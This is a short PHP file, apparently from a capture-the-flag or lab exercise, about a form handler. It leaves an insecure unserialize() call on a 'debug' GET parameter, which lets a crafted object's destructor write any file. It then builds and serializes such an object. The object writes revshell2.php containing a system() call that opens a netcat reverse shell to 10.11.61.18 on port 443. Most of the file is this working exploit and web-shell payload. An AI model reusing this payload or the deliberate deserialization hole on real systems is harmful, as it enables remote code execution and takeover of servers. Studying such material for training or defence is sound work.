<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";
}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$debug_obj = new FormSubmit;
$debug_obj->form_file = 'revshell2.php';
$debug_obj->message = "<?php system('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.18 443 >/tmp/f'); ?>";
$serialized_debug_obj = serialize($debug_obj);
echo $serialized_debug_obj . "\n";
$unserialized_obj = unserialize($serialized_debug_obj);
echo $unserialized_obj->form_file . "\n";

?>
